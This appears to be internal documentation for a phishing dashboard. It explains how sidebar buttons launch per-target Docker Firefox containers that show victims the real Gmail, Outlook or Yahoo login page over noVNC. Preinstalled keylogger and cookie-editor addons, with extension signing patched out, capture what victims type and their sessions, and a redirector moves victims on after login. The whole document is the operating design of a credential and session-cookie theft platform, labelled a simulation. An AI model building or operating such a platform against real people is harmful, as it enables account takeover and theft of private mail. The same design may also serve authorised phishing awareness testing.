# Phishlet Sidebar — Button Flow

This document describes how the **Phishlets** dropdown buttons in the sidebar
work end-to-end across the frontend, backend, and Docker.

File references use the form `path:line` so you can jump straight to the
source.

---

## 1. Container model (one container per phishlet)

A phishlet is a phishing simulation page served from a Firefox container that
emulates a real login flow. Each phishlet runs in its **own** Docker
container, not a shared one.

- Static definitions: `backend/main.py:57` — `PHISHLETS` dict with the three
  configured phishlets:

  | key      | label       | upstream URL                | UI port |
  |----------|-------------|-----------------------------|---------|
  | `gmail`  | Gmail       | `https://gmail.com`         | 5801    |
  | `outlook`| Outlook     | `https://outlook.com`       | 5802    |
  | `yahoo`  | Yahoo Mail  | `https://mail.yahoo.com`    | 5803    |

- Image: `btb_firefox`, built from `backend/Dockerfile.firefox` (based on
  `jlesage/firefox`). It pre-installs:
  - **Cookie Editor** addon
  - **Nifty Keylogger** addon (signing enforcement is patched out in
    `extensions/patch_omnija.py`)
  - `extensions/phishlet-redirector` — reads the `REDIRECT_URL` env var and
    redirects victims to it after a successful login

- Container naming: `phishlet-<key>` (e.g. `phishlet-gmail`).
- Exposed port: `<port>:5800` (the noVNC UI of that container).
- Env vars passed at `docker run`:
  - `FF_OPEN_URL` — the real upstream login page the victim sees
  - `FF_KIOSK` — `1` = fullscreen kiosk mode, `0` = toolbar + extension icons
    visible
  - `REDIRECT_URL` — where the addon sends the victim post-login (or
    post-credential capture)

> **Important:** the standalone **Launch Firefox** button in the sidebar
> starts a **separate** container named `firefox` on port `5800` (VNC on
> `5900`). That container is *not* a phishlet. Phishlet containers are
> `phishlet-gmail`, `phishlet-outlook`, `phishlet-yahoo`.

### Where state lives

- **Running / not running**: read live by shelling `docker ps` in
  `main.py:256` and `main.py:225`.
- **Persistent settings** (kiosk flag, redirect URL, pause URL): MongoDB
  collection `phishlet_settings`, key field `key`. Loaded into the in-memory
  `PHISHLETS` dict on startup at `main.py:166`.
- **Visits** (live victim activity polled by the modal): MongoDB collection
  `visits`, written by the addon via `POST /api/phishlets/visit`.

---

## 2. The sidebar buttons

The Phishlets dropdown is rendered in `frontend/src/components/Sidebar.jsx`.
The list of phishlets is fetched lazily when the dropdown opens
(`Sidebar.jsx:215`) via `GET /api/phishlets` (`main.py:254`).

For each phishlet, the buttons that appear depend on its state:

- If **not running** → only a green `Launch` button (plus the `⚙` settings).
- If **running & not paused** → `Open`, `Pause`, `Remove`, `Kiosk/Toolbar`,
  `⚙`.
- If **running & paused** → `Open`, `Unpause`, `Remove`, `Kiosk/Toolbar`,
  `⚙`.

The little icon next to the label reflects state (`Sidebar.jsx:379`):
`🟢` running, `⏸` paused, `🔴` stopped.

All API calls go through `useAsyncAction` (`frontend/src/hooks/useAsyncAction.js`)
which logs `$ <label>...` to the terminal panel and resolves with the
backend JSON.

---

### 2.1 Launch

**UI:** `Sidebar.jsx:386` — green `Launch` button (only when `!p.running`).

**Handler:** `handlePhishletLaunch(p.key, p.label, p.port)` —
`Sidebar.jsx:237`.

**Flow:**

1. Frontend calls `useAsyncAction.run('Launch <Label>', '/api/phishlets/launch', { key })`
   which issues `POST /api/phishlets/launch` with body `{ key }`.
2. Backend handler `launch_phishlet` at `main.py:292`:
   1. Validates `key` is in the `PHISHLETS` dict.
   2. `docker rm -f phishlet-<key>` — kill any prior container.
   3. `docker volume rm phishlet-<key>-config` — clear cookies/profile.
   4. `docker run -d --name phishlet-<key> -p <port>:5800
      -e FF_OPEN_URL=<phishlet.url> -e FF_KIOSK=<FF_KIOSK_DEFAULT>
      -e REDIRECT_URL=<phishlet.redirect_url>
      -v phishlet-<key>-config:/config btb_firefox`
   5. Returns the container ID plus the public UI URL.
3. If the response status is `success`, the frontend waits **4 s**
   (`Sidebar.jsx:243`) and then calls `onOpenBrowser(url, label, key)`,
   which is `addTab` in `Dashboard.jsx:68`. That adds an iframe tab
   pointing at `http://<VPS_IP>:<port>` — the noVNC UI of the *new* phishlet
   container.

**Result:** a new container is created from a clean volume, and an iframe
tab in the dashboard is opened against its noVNC UI.

---

### 2.2 Open

**UI:** `Sidebar.jsx:393` — blue `Open` button (only when `p.running`).

**Handler:** `handlePhishletOpen(url, label, key)` — `Sidebar.jsx:251`.

**Flow:**

1. Frontend calls `onOpenBrowser(url, label, key)` directly — no backend
   call, no `useAsyncAction`.
2. `addTab` (`Dashboard.jsx:68`) checks if a tab with the same URL already
   exists and reuses it; otherwise creates a new iframe tab pointing at
   `http://<VPS_IP>:<port>`.

**Result:** an iframe tab in the dashboard opens/activates for the
*already-running* phishlet container.

---

### 2.3 Remove

**UI:** `Sidebar.jsx:415` — red `Remove` button (only when `p.running`).

**Handler:** `handlePhishletRemove(p.name, p.label, p.port, p.key)` —
`Sidebar.jsx:256`.

**Flow:**

1. Frontend calls `useAsyncAction.run('Remove <Label>', '/api/containers/remove', { name })`
   which issues `POST /api/containers/remove` with body `{ name }`.
2. Backend `remove_container` at `main.py:245`:
   1. Validates `name` against `CONTAINER_NAME_RE`.
   2. `docker rm -f <name>`.
   3. If the name starts with `phishlet-`, also `docker volume rm
      <name>-config` to wipe cookies/profile.
3. On success, the frontend:
   - Calls `onContainerRemoved(port)` which is `closeTabsByPort` in
     `Dashboard.jsx:99` — closes any iframe tab whose URL contains
     `:<port>`.
   - Fires `POST /api/phishlets/<key>/unpause` (`main.py:441`) to clear any
     stale `pause_url` flag in Mongo so the row no longer shows ⏸.

**Result:** the container and its config volume are destroyed, and the
matching iframe tab in the dashboard is auto-closed.

---

### 2.4 Kiosk / 🧩 Toolbar toggle (single button, toggles per phishlet)

**UI:** `Sidebar.jsx:421` — purple/gray button whose label and tooltip
change based on `p.kiosk`:

- `p.kiosk === true` → label `🖥 Kiosk`, tooltip "Kiosk ON — click to show
  toolbar + extension icons".
- `p.kiosk === false` → label `🧩 Toolbar`, tooltip "Kiosk OFF — click to go
  fullscreen".

**Handler:** `handlePhishletToggleKiosk(p.key, p.label)` — `Sidebar.jsx:308`.

**Flow:**

1. Frontend calls `useAsyncAction.run('Toggle Kiosk <Label>',
   '/api/phishlets/<key>/toggle-kiosk', {})` → `POST
   /api/phishlets/<key>/toggle-kiosk`.
2. Backend `toggle_kiosk` at `main.py:469`:
   1. Reads current `kiosk` flag from Mongo (default `True`); flips it.
   2. `docker rm -f phishlet-<key>` — destroys the running container.
   3. `docker run -d` **recreates** the same container with
      `-e FF_KIOSK=<0|1>` so the init scripts honor the new mode. The config
      volume is preserved (only the container is rebuilt).
   4. Persists the new `kiosk` boolean in `phishlet_settings`.
3. On success, the frontend refetches the phishlet list to refresh icons
   and tooltips (`Sidebar.jsx:311`).

**Behavior:**

- `FF_KIOSK=1` → Firefox launches fullscreen with no chrome (the "Kiosk"
  state). The Cookie Editor / keylogger addons are still installed and
  running in the background.
- `FF_KIOSK=0` → Firefox launches with the normal toolbar and the addon
  icons visible, so the operator can click into the extensions (the
  "🧩 Toolbar" state).

> **Implementation note:** today the toggle works by *destroying and
> recreating* the container so the new `FF_KIOSK` env is picked up at
> container init. This is destructive of any live Firefox session in that
> container. A future improvement is an **in-place** toggle using
> `xdotool key F11` inside the running container (or a tiny
> `/config/<toggle-kiosk>` sentinel the addon watches for) so the session
> survives the toggle.

---

### 2.5 Pause

**UI:** `Sidebar.jsx:408` — amber `Pause` button (only when `p.running &&
!p.paused`). Clicking it opens a small modal that asks for a **redirect
URL** (the page visitors will be sent to instead of the phishlet).

**Handlers:**

- `handlePhishletPause(p.key, p.label)` — `Sidebar.jsx:264` — opens the
  modal.
- `confirmPause()` — `Sidebar.jsx:269` — submits the form.

**Flow:**

1. The user types a URL into the modal (`Sidebar.jsx:506`) and clicks
   `Pause` (`Sidebar.jsx:522`).
2. Frontend calls `POST /api/phishlets/<key>/pause` with body
   `{ redirect_url: "<typed url>" }`.
3. Backend `pause_phishlet` at `main.py:407`:
   1. Validates the URL (must start with `http://` or `https://`).
   2. Reads the current `redirect_url` from the in-memory `PHISHLETS[key]`
      and stores it in Mongo as `original_url` (the snapshot to restore on
      unpause).
   3. Stores the new URL as `pause_url` in Mongo and overwrites
      `PHISHLETS[key]["redirect_url"]` in memory.
   4. `docker restart phishlet-<key>` so the redirector addon re-reads
      `REDIRECT_URL` for subsequent post-login redirects.
4. On success, the frontend:
   - Calls `onPauseToggle(key, pauseUrl)` — this is `updateTabUrl` in
     `Dashboard.jsx:111`, which rewrites the URL of any open iframe tab
     for that phishlet so the user is sent straight to the pause target.
   - Reopens the Phishlets dropdown so the row now shows `Unpause` and the
     ⏸ icon.

**Result:** the phishlet container keeps running, but new visitors are
redirected to the operator-supplied URL instead of the fake login page.
The Mongo `phishlet_settings.pause_url` is the source of truth for the
"paused" badge in the sidebar (see `main.py:264`).

---

### 2.6 Unpause

**UI:** `Sidebar.jsx:401` — yellow `Unpause` button (only when `p.paused`).

**Handler:** `handlePhishletUnpause(p.key, p.label, p.port)` —
`Sidebar.jsx:290`.

**Flow:**

1. Frontend calls `POST /api/phishlets/<key>/unpause` (no body).
2. Backend `unpause_phishlet` at `main.py:441`:
   1. Reads `original_url` from Mongo (the value snapshotted at pause
      time).
   2. `$unset`s `pause_url`, `original_url`, `paused_at`, `paused_by`;
      sets `redirect_url`/`url` back to `original_url`.
   3. Restores `PHISHLETS[key]["redirect_url"]` in memory.
   4. `docker restart phishlet-<key>`.
3. On success, the frontend:
   - Calls `onPauseToggle(key, originalUrl)` to flip the iframe tab back
     to `http://<VPS_IP>:<port>`.
   - Reopens the Phishlets dropdown so the row no longer shows `Unpause`.

**Result:** the phishlet is live again; visitors are no longer
redirected away.

---

## 3. Sequence diagram (Launch → Pause → Unpause)

```
Operator           Sidebar.jsx                Backend (main.py)         Docker
   |                    |                            |                     |
   |  click Launch      |                            |                     |
   |------------------->|                            |                     |
   |                    |  POST /api/phishlets/launch|                     |
   |                    |--------------------------->|                     |
   |                    |                            |  docker rm -f ...   |
   |                    |                            |-------------------->|
   |                    |                            |  docker volume rm   |
   |                    |                            |-------------------->|
   |                    |                            |  docker run -d ...  |
   |                    |                            |-------------------->|
   |                    |        { status, msg }     |                     |
   |                    |<---------------------------|                     |
   |  iframe tab opens  |  addTab(url,label,key)     |                     |
   |  (noVNC UI)        |                            |                     |
   |<-------------------|                            |                     |
   |                    |                            |                     |
   |  click Pause, type |                            |                     |
   |  redirect URL      |                            |                     |
   |------------------->|                            |                     |
   |                    |  POST /api/phishlets/<k>/pause                   |
   |                    |--------------------------->|                     |
   |                    |  Mongo: save pause_url,    |                     |
   |                    |         original_url       |                     |
   |                    |                            |  docker restart ... |
   |                    |                            |-------------------->|
   |                    |        { paused: true }    |                     |
   |                    |<---------------------------|                     |
   |  iframe tab jumps  |  updateTabUrl(key,pauseUrl)|                     |
   |  to redirect URL   |                            |                     |
   |<-------------------|                            |                     |
   |                    |                            |                     |
   |  click Unpause     |                            |                     |
   |------------------->|                            |                     |
   |                    |  POST /api/phishlets/<k>/unpause                 |
   |                    |--------------------------->|                     |
   |                    |  Mongo: restore original_url,$unset pause fields |
   |                    |                            |  docker restart ... |
   |                    |                            |-------------------->|
   |                    |        { paused: false }   |                     |
   |                    |<---------------------------|                     |
   |  iframe tab jumps  |  updateTabUrl(key,origUrl) |                     |
   |  back to noVNC UI  |                            |                     |
   |<-------------------|                            |                     |
```

---

## 4. Quick reference

| Button        | Endpoint                                    | Docker effect                                | Frontend effect               |
|---------------|---------------------------------------------|----------------------------------------------|-------------------------------|
| Launch        | `POST /api/phishlets/launch`                | `rm -f` + `volume rm` + `run -d` (new)       | Opens new iframe tab after 4s |
| Open          | *(none — frontend only)*                    | none                                         | Adds/activates iframe tab     |
| Remove        | `POST /api/containers/remove`               | `rm -f` + `volume rm`                        | Closes iframe tab for that port|
| Kiosk/Toolbar | `POST /api/phishlets/<key>/toggle-kiosk`    | `rm -f` + `run -d` with new `FF_KIOSK`       | Refreshes phishlet list       |
| Pause         | `POST /api/phishlets/<key>/pause`           | `restart` (REDIRECT_URL swapped)             | Switches iframe tab to pause URL|
| Unpause       | `POST /api/phishlets/<key>/unpause`         | `restart` (REDIRECT_URL restored)            | Switches iframe tab back      |

### Why the sidebar `Launch Firefox` (port 5800) is separate

`/api/launch` (`main.py:190`) starts a single container named `firefox`,
not a phishlet. It is the operator's *general-purpose* Firefox, exposed on
`:5800` (UI) and `:5900` (VNC). It has no `FF_OPEN_URL`, no
`REDIRECT_URL`, and no phishlet redirector addon wired in. The Phishlets
buttons above never touch it.
